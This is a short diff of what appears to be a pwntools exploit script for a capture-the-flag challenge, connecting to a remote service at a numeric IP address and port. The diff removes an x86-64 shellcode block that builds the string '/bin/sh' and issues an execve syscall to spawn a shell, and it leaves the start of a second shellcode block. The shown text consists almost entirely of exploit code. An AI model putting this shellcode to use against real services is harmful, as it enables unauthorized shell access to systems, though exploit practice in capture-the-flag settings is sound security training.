@@ -11,18 +11,6 @@ if len(sys.argv) == 1:
 else:
     p = remote("13.112.180.65", "8361")
 
-sc = asm('''
-        mov rbx, 0x68732f6e69622e
-        inc bx
-        push rsi
-        push rbx
-        push rsp
-        pop rdi
-        add al, 58
-        inc al
-        syscall
-        ''')
-
 sc2 = asm('''
         mov dh, 0x34
         mov rsi, rsp
